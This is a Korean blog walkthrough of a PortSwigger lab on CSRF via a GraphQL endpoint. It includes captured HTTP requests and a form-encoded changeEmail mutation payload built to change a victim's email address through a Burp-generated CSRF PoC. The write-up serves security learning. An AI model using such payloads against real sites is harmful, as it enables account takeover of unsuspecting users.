---
layout: post
title: "Burp Academy-GraphQL API 관련 취약점: Performing CSRF exploits over GraphQL"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, GraphQL]
toc: true
last_modified_at: 2023-11-22 09:50:00 +0900
---


# 개요
- GraphQL 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api
- 취약점 설명페이지: https://portswigger.net/web-security/graphql
- 난이도: PRACTITIONER (보통)

# 배경지식: GraphQL CSRF
- Content-Type이 `application/json` 인 요청만 받아들이는 POST 엔드포인트는 CSRF에 대해 안전하다. 
- 이는 해당 타입이면 간단한 요청(Simple Request)이 아니기 때문에 CORS가 적용되기 때문이다. CORS에서 허용되어 있지 않다면 타 사이트에서 요청을 전송할 수 없다. 
- 그러나 엔드포인트가 POST대신에 GET 요청을 허용하는 경우, 혹은 `x-www-form-urlencoded` 타입을 허용하는 경우는 CSRF가 가능하다. 일반적인 폼으로도 전송가능하기 때문이다. 

# 랩 설명
- 이 랩에서는 유저 관리기능에 GraphQL 엔드포인트를 사용하고 있다. 
- 엔드포인트는 `x-www-form-urlencoded` 컨텐츠 타입의 요청을 받아들이므로 CSRF공격이 가능하다. 
- 랩을 풀려면 페이지를 본 사람의 이메일 주소를 변경시키는 CSRF용 HTML을 만들어서 exploit 서버에 업로드하면 된다. 
- `wiener:peter` 크레덴셜을 사용해서 로그인할 수 있다. 

```
The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of x-www-form-urlencoded and is therefore vulnerable to cross-site request forgery (CSRF) attacks.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: wiener:peter.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

Learn more about Working with GraphQL in Burp Suite.
```

# 풀이
## 이메일 주소 변경 엔드포인트 관찰

일단은 다음과 같이 `Content-Type`이 `application/json` 으로 제대로 지정되어서 보내지고 있다. 

```http
POST /graphql/v1 HTTP/2
Host: 0a6e00c203f1fa2f854526f2006e00b4.web-security-academy.net
Cookie: session=5LmJbiREL0u1RAiDBGHh7EtaStpgEHTc; session=5LmJbiREL0u1RAiDBGHh7EtaStpgEHTc
Content-Length: 224
Sec-Ch-Ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
Accept: application/json
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://0a6e00c203f1fa2f854526f2006e00b4.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a6e00c203f1fa2f854526f2006e00b4.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"moon@tester.com"}}}
```

응답

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 79

{
  "data": {
    "changeEmail": {
      "email": "moon@tester.com"
    }
  }
}
```

## 이메일 변경 엔드포인트에 다른 Content-Type으로 요청 시도
일단 ContentType만 `x-www-form-urlencoded`으로 바꿔서 쿼리를 보내본다. 그러면 `"Query not present"`라는 응답이 돌아온다. Query 파라메터만 추가해주면  `x-www-form-urlencoded` ContentType도 사용가능해보인다. 

![다른 Content-Type으로 요청 시도](/images/burp-academy-graphql-5-1.png)


## 쿼리 형태 변경

쿼리를 가장 간단한 형식으로 변경한다. 

다음 쿼리를 변수가 입력된 형태의 간단한 형태로 바꾼다. 

```
mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}
```

```
mutation {
    changeEmail(input: { email: "moon@tester.com" }) {
        email
    }
}
```

이 쿼리를 서버에 보내본다. 잘 동작하는 것을 볼 수 있다.

![쿼리동작확인](/images/burp-academy-graphql-5-2.png)



## 쿼리를 변경해서 시도

```
mutation {\n    changeEmail(input: { email: \"moon@tester.com\" }) {\n        email\n    }\n}
```

위의 쿼리를 URL인코딩하면 다음과 같이 된다. 

```
mutation%20%7B%5Cn%20%20%20%20changeEmail(input%3A%20%7B%20email%3A%20%5C%22moon%40tester.com%5C%22%20%7D)%20%7B%5Cn%20%20%20%20%20%20%20%20email%5Cn%20%20%20%20%7D%5Cn%7D
```

이 것을 query 파라메터로 해서 ContentType `x-www-form-urlencoded`을 지정해서 보내면 "Invalid syntax with ANTLR error 'token recognition error at: '%'' at line 1 column 9" 에러메세지가 돌아온다. 

![에러 메세지](/images/burp-academy-graphql-5-3.png)

스페이스를 의미하는 `%20`를 서버측에서 인식하지 못하는 것으로 보인다. 

POST로 파라메터를 보낼 때 스페이스나 괄호({})를 변환하는 규칙을 알아봐야겠다. 

음.. 모르겠다. 답보자!

# 답보고 풀이
답을 보고 원인을 알았다. 

## 포인트 1. 공백은 +기호로 변환 
- 답에서는 다음과 같이 공백이 `+`로 변환(인코딩)되어 있다. 

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

- 보통 URL인코딩하면 공백은 `%20`로 변환된다. 그런데 `+`로 변환하는 경우도 있는 것 같다. 뭐가 차이일까?
- [여기](https://stackoverflow.com/questions/1634271/url-encoding-the-space-character-or-20)를 보면 같은 질문이 있다. 
- HTML 폼에서 전송될 때는 공백이 `+`로 보내진다는 것 같다. 


## 포인트 2. application/x-www-form-urlencoded 컨텐트 타입
Content-Type이 `application/x-www-form-urlencoded` 으로 된 요청이어야만 서버가 제대로 응답한다. `x-www-form-urlencoded`일 때는 제대로 응답하지 않았다. 애초에 찾아보니 헤더값이 `x-www-form-urlencoded`인 경우는 찾아볼 수 없고 모두 `application/x-www-form-urlencoded` 이었다. 


## 포인트 3. \n이나 \" 등이 들어가 있는 부분을 제거 
쿼리에서 \n이나 \" 등이 들어가 있는 부분을 제거한 후에 변환한다. 

예를들어 이 쿼리는 

```
mutation {\n    changeEmail(input: { email: \"moon@tester.com\" }) {\n        email\n    }\n}
```

요렇게 바꾼다. 

```
mutation {
changeEmail(input: { email: "moon@tester.com" }) {       
 email
}
}
```

그리고 URL인코딩한다. 그러면 다음과 같이 된다. 

```
mutation%20%7B%0AchangeEmail(input%3A%20%7B%20email%3A%20%22moon%40tester.com%22%20%7D)%20%7B%20%20%20%20%20%20%20%0A%20email%0A%7D%0A%7D
```

여기서 %20만 +로 변환한다. 그러면 이렇게 된다. 이 상태로 요청을 보내면 서버측에서 잘 알아먹는다. 

```
mutation+%7B%0AchangeEmail(input%3A+%7B+email%3A+%22moon%40tester.com%22+%7D)+%7B+++++++%0A+email%0A%7D%0A%7D
```

![POST 바디로 쿼리 실행성공](/images/burp-academy-graphql-5-4.png)

## CSRF Generator 사용

HTTP 요청에서 마우스 오른쪽 버튼을 눌러서 Engagement tools > Generate CSRF PoC를 선택한다. 여기서 이메일의 값을 위와 다른 값으로 변경해둔다. Test in Brower를 선택해서 이 HTML 폼이 제대로 동작하는지 확인한다. 

![CSRF PoC화면](/images/burp-academy-graphql-5-5.png)

## exploit서버에서 HTML폼을 victim에게 전달

exploit서버에서 HTML폼을 Body부분에 붙여넣기 하고 Deliver exploit to victim을 클릭한다. 

![exploit서버](/images/burp-academy-graphql-5-6.png)

그러면 이메일이 업데이트되고 문제가 풀렸다는 메세지가 나타난다. 

![풀이 성공](/images/burp-academy-graphql-5-success.png)

# 감상
이번 랩에서는 CSRF공격을 수행하기 위한 여러가지 포인트를 배울 수 있었다. 먼저 HTML폼에서 전송되는 Content-Type을 알게되었고, 공격은 +로 변환된다는 것도 알게 되었다. 그리고 GraphQL 쿼리를 폼 파라메터로 변환할 떄의 팁도 알게 되었다. 